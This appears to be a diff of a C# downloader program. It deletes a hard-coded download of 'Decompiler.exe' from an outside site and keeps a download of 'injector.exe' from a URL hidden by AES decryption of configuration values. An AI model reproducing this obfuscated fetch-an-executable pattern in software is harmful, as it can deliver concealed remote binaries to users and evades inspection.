@@ -73,7 +73,6 @@ class Program
             System.Environment.Exit(1);
         }
 
-        string requestUri = "https://getstorm.superiorcommunist.party/assets/Decompiler.exe"; // decompiler
         string requestUri2 = AESEncryption.Decrypt(root.GetProperty("L2").ToString(), root.GetProperty("question").ToString()); // injector
        
         if (!Directory.Exists(Path.Combine(currentDir, "Bin")))
@@ -81,11 +80,6 @@ class Program
             Directory.CreateDirectory(Path.Combine(currentDir, "Bin"));
         }
 
-        Console.WriteLine("[!] Downloading decompiler.exe..");
-        byte[] dataDecompiler = await client.GetByteArrayAsync(requestUri);
-        await File.WriteAllBytesAsync(Path.Combine("Bin", "Decompiler.exe"), dataDecompiler);
-
-        Console.WriteLine("[!] Downloaded decompiler.exe..");
         Console.WriteLine("[!] Downloading injector.exe..");
 
         byte[] dataInjector = await client.GetByteArrayAsync(requestUri2);
